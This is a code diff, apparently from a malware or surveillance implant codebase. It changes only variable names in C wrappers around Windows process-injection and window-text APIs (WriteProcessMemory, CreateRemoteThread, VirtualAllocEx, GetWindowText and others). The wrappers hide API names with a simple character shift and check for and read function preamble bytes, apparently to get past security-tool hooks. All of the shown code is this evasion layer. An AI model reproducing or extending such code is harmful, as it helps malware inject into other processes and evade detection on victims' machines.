@@ -1,22 +1,22 @@
 #include "HM_PreamblePatch.h"
 #include "common.h"
 
-LRESULT WINAPI HM_SafeSendMessageTimeoutW(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam, UINT fuflags, UINT utimeout, PDWORD_PTR lpdwresult)
+LRESULT WINAPI HM_SafeSendMessageTimeoutW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PDWORD_PTR lpdwResult)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"user32.dll"}, cFunc[] = {"TfoeNfttbhfUjnfpvuX"};
+	CHAR cDll[] = {"user32.dll"}, szSendMessageTimeoutW[] = {"TfoeNfttbhfUjnfpvuX"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE)
+	if(HM_IsWrapped(cDll, szSendMessageTimeoutW) == FALSE)
 	{
-		return FNC(SendMessageTimeoutW)(hwnd, msg, wparam, lparam, fuflags, utimeout, lpdwresult);
+		return FNC(SendMessageTimeoutW)(hWnd, Msg, wParam, lParam, fuFlags, uTimeout, lpdwResult);
 	}
 	else
 	{
 		if (pBytes == NULL)
 		{
-			if (HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if (HM_ReadFunction(cDll, szSendMessageTimeoutW, 5, &pBytes) == 0)
 			{
-				return FNC(SendMessageTimeoutW)(hwnd, msg, wparam, lparam, fuflags, utimeout, lpdwresult);
+				return FNC(SendMessageTimeoutW)(hWnd, Msg, wParam, lParam, fuFlags, uTimeout, lpdwResult);
 			}
 		}
 	}
@@ -27,13 +27,13 @@ LRESULT WINAPI HM_SafeSendMessageTimeoutW(HWND hwnd, UINT msg, WPARAM wparam, LP
 BOOL WINAPI HM_SafeVirtualProtectEx(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T nSize, DWORD flNewProtect, PDWORD lpflOldProtect)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"WjsuvbmQspufduFy"};
+	CHAR cDll[] = {"kernel32.dll"}, szVirtualProtectEx[] = {"WjsuvbmQspufduFy"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE){
+	if(HM_IsWrapped(cDll, szVirtualProtectEx) == FALSE){
 		return FNC(VirtualProtectEx)(hProcess, lpBaseAddress, nSize, flNewProtect, lpflOldProtect);
 	}else{
 		if(pBytes == NULL)
-			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if(HM_ReadFunction(cDll, szVirtualProtectEx, 5, &pBytes) == 0)
 				return FNC(VirtualProtectEx)(hProcess, lpBaseAddress, nSize, flNewProtect, lpflOldProtect);
 	}
 
@@ -43,13 +43,13 @@ BOOL WINAPI HM_SafeVirtualProtectEx(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_
 BOOL WINAPI HM_SafeWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"XsjufQspdfttNfnpsz"};
+	CHAR cDll[] = {"kernel32.dll"}, szWriteProcessMemory[] = {"XsjufQspdfttNfnpsz"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE){
+	if(HM_IsWrapped(cDll, szWriteProcessMemory) == FALSE){
 		return FNC(WriteProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
 	}else{
 		if(pBytes == NULL)
-			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if(HM_ReadFunction(cDll, szWriteProcessMemory, 5, &pBytes) == 0)
 				return FNC(WriteProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
 	}
 
@@ -59,13 +59,13 @@ BOOL WINAPI HM_SafeWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPC
 BOOL WINAPI HM_SafeReadProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"SfbeQspdfttNfnpsz"};
+	CHAR cDll[] = {"kernel32.dll"}, szReadProcessMemory[] = {"SfbeQspdfttNfnpsz"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE){
+	if(HM_IsWrapped(cDll, szReadProcessMemory) == FALSE){
 		return FNC(ReadProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
 	}else{
 		if(pBytes == NULL)
-			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if(HM_ReadFunction(cDll, szReadProcessMemory, 5, &pBytes) == 0)
 				return FNC(ReadProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
 	}
 
@@ -81,13 +81,13 @@ HANDLE WINAPI HM_SafeCreateRemoteThread(HANDLE hProcessRem,
 								 LPDWORD lpThreadId)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"DsfbufSfnpufUisfbe"};
+	CHAR cDll[] = {"kernel32.dll"}, szCreateRemoteThread[] = {"DsfbufSfnpufUisfbe"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE){
+	if(HM_IsWrapped(cDll, szCreateRemoteThread) == FALSE){
 		return FNC(CreateRemoteThread)(hProcessRem, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
 	}else{
 		if(pBytes == NULL)
-			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if(HM_ReadFunction(cDll, szCreateRemoteThread, 5, &pBytes) == 0)
 				return FNC(CreateRemoteThread)(hProcessRem, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
 	}
 
@@ -179,16 +179,16 @@ LPVOID WINAPI HM_SafeVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dw
 int WINAPI HM_SafeGetWindowTextW(HWND hWnd, LPWSTR lpString, int nMaxCount)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"user32.dll"}, cFunc[] = {"HfuXjoepxUfyuX"};
+	CHAR cDll[] = {"user32.dll"}, szGetWindowTextW[] = {"HfuXjoepxUfyuX"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE)
+	if(HM_IsWrapped(cDll, szGetWindowTextW) == FALSE)
 	{
 		return FNC(GetWindowTextW)(hWnd, lpString, nMaxCount);
 	}
 	else
 	{
 		if(pBytes == NULL)
-			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if(HM_ReadFunction(cDll, szGetWindowTextW, 5, &pBytes) == 0)
 				return FNC(GetWindowTextW)(hWnd, lpString, nMaxCount);
 	}
 
@@ -198,9 +198,9 @@ int WINAPI HM_SafeGetWindowTextW(HWND hWnd, LPWSTR lpString, int nMaxCount)
 int WINAPI HM_SafeGetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount)
 {
 	static PBYTE pBytes = NULL;
-	CHAR cDll[] = {"user32.dll"}, cFunc[] = {"HfuXjoepxUfyuB"};
+	CHAR cDll[] = {"user32.dll"}, szGetWindowTextA[] = {"HfuXjoepxUfyuB"};
 	
-	if(HM_IsWrapped(cDll, cFunc) == FALSE)
+	if(HM_IsWrapped(cDll, szGetWindowTextA) == FALSE)
 	{
 		return FNC(GetWindowTextA)(hWnd, lpString, nMaxCount);
 	}
@@ -208,7 +208,7 @@ int WINAPI HM_SafeGetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount)
 	{
 		if (pBytes == NULL)
 		{
-			if (HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
+			if (HM_ReadFunction(cDll, szGetWindowTextA, 5, &pBytes) == 0)
 			{
 				return FNC(GetWindowTextA)(hWnd, lpString, nMaxCount);
 			}
